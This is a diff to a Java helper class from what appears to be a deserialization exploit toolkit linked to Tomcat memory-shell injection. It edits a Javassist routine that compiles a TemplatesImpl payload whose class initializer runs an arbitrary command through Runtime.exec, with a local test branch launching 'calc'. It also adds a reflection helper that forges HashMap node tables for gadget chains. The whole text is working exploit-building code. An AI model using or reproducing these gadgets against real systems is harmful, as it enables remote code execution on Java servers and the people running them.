@@ -8,7 +8,10 @@ import gadget.memshell.TomcatShellInject2;
 import javassist.*;
 
 import java.io.IOException;
+import java.lang.reflect.Array;
+import java.lang.reflect.Constructor;
 import java.util.Base64;
+import java.util.HashMap;
 
 import static util.ReflectionUtils.setFieldValue;
 
@@ -17,8 +20,14 @@ public class GadgetUtils {
     public static TemplatesImpl createTemplatesImpl(String cmd)throws CannotCompileException, NotFoundException, IOException, InstantiationException, IllegalAccessException, NoSuchFieldException{
         ClassPool pool = ClassPool.getDefault();
         pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
-        CtClass cc = pool.makeClass("Squirtle");
-        cc.makeClassInitializer().insertBefore("java.lang.Runtime.getRuntime().exec("+cmd+");");
+        CtClass cc = pool.makeClass("SOTA");
+        //本机测试
+        if(cmd.contains("calc")){
+            cc.makeClassInitializer().insertBefore("java.lang.Runtime.getRuntime().exec(\"calc\");");
+        }else {
+            cc.makeClassInitializer().insertBefore("java.lang.Runtime.getRuntime().exec("+cmd+");");
+        }
+//        System.out.println("java.lang.Runtime.getRuntime().exec("+cmd+");");
         cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
         cc.writeFile();
         byte[] classBytes = cc.toBytecode();
@@ -98,5 +107,25 @@ public class GadgetUtils {
         CtClass ctClass = pool.get(clz.getName());
         byte[] targetByteCodes = ctClass.toBytecode();
         return Base64.getEncoder().encodeToString(targetByteCodes);
+    }
+
+    public static HashMap makeMap (Object v1, Object v2 ) throws Exception{
+        HashMap s = new HashMap();
+        ReflectionUtils.setFieldValue(s, "size", 2);
+        Class nodeC;
+        try {
+            nodeC = Class.forName("java.util.HashMap$Node");
+        }
+        catch ( ClassNotFoundException e ) {
+            nodeC = Class.forName("java.util.HashMap$Entry");
+        }
+        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
+        nodeCons.setAccessible(true);
+
+        Object tbl = Array.newInstance(nodeC, 2);
+        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
+        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
+        ReflectionUtils.setFieldValue(s, "table", tbl);
+        return s;
     }
 }
